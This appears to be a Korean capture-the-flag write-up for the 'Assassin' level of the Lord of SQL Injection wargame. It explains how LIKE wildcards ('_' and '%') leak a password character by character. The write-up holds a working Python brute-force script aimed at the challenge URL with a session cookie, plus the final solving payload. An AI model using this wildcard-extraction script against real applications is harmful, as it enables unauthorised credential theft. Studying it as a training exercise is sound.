# Lord of SQL Injection No.15 Assassin

Assassin 문제는 와일드카드(`_`, `%`)를 사용하여 원하는 `id`의 `pw`값을 뽑아낼 수 있는 지 확인하는 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?
```

```php
if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~");
```

`preg_match`에서 `'`를 필터링하면 `No Hack ~_~`을 출력한 후 문제 풀이에 실패하게 된다.

```php
$query = "select id from prob_assassin where pw like '{$_GET[pw]}'";
```

`$_GET` 방식으로 `pw`만 입력받아 query에 직접 넣는다.

#### 문제 풀이 조건

```php
if($result['id'] == 'admin') solve("assassin");
```

`id`값이 `admin`이 되면 문제 풀이에 성공하게 된다.

## Solution

```python
import urllib.request
import string
from urllib.parse import quote

url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
result = ""
guest_result=""
guest_pwlen = 0
admin_pwlen = 0
tmp = ""
find = False
random = string.digits + string.ascii_letters

for i in range(1,20):
    length_chk=('_' * i)
    length_chk=quote(length_chk)
    re = urllib.request.Request(url + length_chk)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    res = urllib.request.urlopen(re)
    find_length = res.readline()
    print(find_length)

    if str(find_length).find("Hello guest") != -1:
        guest_pwlen = i
        print("Guest Password length = {}".format(guest_pwlen))
    if str(find_length).find("Hello admin") != -1:
        admin_pwlen = i
        print("Admin Password length = {}".format(admin_pwlen))
        find = True
        break
if find != True:
    admin_pwlen = guest_pwlen
    print("Admin Password length = {} // admin_pwlen = guest_pwlen".format(admin_pwlen))
    find = False

for i in range(1,admin_pwlen+1):
    for j in random:
        find = False
        add_url = result + "{}".format(j) + '%'
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
        res = urllib.request.urlopen(re)
        find_pw = res.readline()

        if str(find_pw).find("Hello admin") != -1:
            result += j
            print("Admin Password => {}".format(result))
            find = True
        if str(find_pw).find("Hello guest") != -1:
            guest_result += j
            tmp = j
            print("Guest Password => {}".format(guest_result))
            break
        if find != True:
            result = guest_result

print("Finished Searching.")
print("Password : {}%".format(result))
```

python 코드를 짰는데 오류가 자잘하다.

첫번째 `for`문에서 `_`를 사용하여 `pwlen`을 알아내는데,
`preg_match`에서 항상 필터링 되던 `_`를 사용한 것을 볼 수 있을 것이다.

`_`는 와일드 카드라고 불리는 녀석인데. 와일드 카드의 종류에는 대표적으로 `_`와 `%`가 있다.

`_`는 어떤 값이든 대체할 수 있는 미지수라고 보면 된다.
예를 들어, `apple`이라는 문자열이 있다면, 문자열의 길이만큼 `_` 를 5개 사용하여 `_____`를 대체하면 `length` 함수를 사용할 때 같은 문자열로 인식할 수 있다.

그리고 `%`는 예를 들어, `a%` 와 같이 사용하게 되면
"a로 시작하는 모든 문자열", `%p%`와 같이 사용하면 "문자열 중간에 p가 들어가는 모든 문자열", `%e`와 같이 사용하게 되면 "e로 끝나는 모든 문자열" 을 의미하게 된다.

주의할 점으로는 와일드 카드는 `like` 함수가 앞에 사용되었을 때만 사용이 가능하다는 것이다.

`for`문을 반복하면서 `guest`와 `admin`을 비교하면서 원하는 값을 찾은 이유는 `admin`의 `pw`값을 찾기 전에 원치 않게 `guest`의 `pw`값을 찾게 되면 `admin`의 `pw`값을 찾기도 전에 `for`문이 넘어가기 때문에 정상적으로 `admin`의 `pw` 값을 찾지 못하게 되어 이를 방지하기 위해 `guest`의 `pw`값을 찾더라도 `for`문이 넘어가지 않도록 만든 것이다.

`for`문이 수행되면 `admin`의 `pw`값은 `832%`가 나오게 된다.

(`guest`의 `pw`값은 `83d....` 와 같은 형식으로 진행되기 때문에 3번째 문자부터 `admin`의 `pw`값과 차이가 나게 된다.)

원래 소스 코드를 `admin`의 `pw`값과 `guest`의 `pw`값이 달라지는 시점에서 바로 반복문 실행을 중지하고 결과를 출력하는 형식으로 짜보려 했으나 그 시점에서 `admin`의 `pw`값을 출력한 후 `guest`의 `pw`값이 모두 찾아질 때까지 `for`문을 반복하는 형식이 되어버렸다. 이는 추후에 수정하여 writeup을 다시 올릴 예정이다.

```
http://los.eagle-jump.org/assassin_***.php?pw=832%
```

`pw=832%`를 URL에 삽입하여 전달하면 문제 풀이에 성공하게 된다.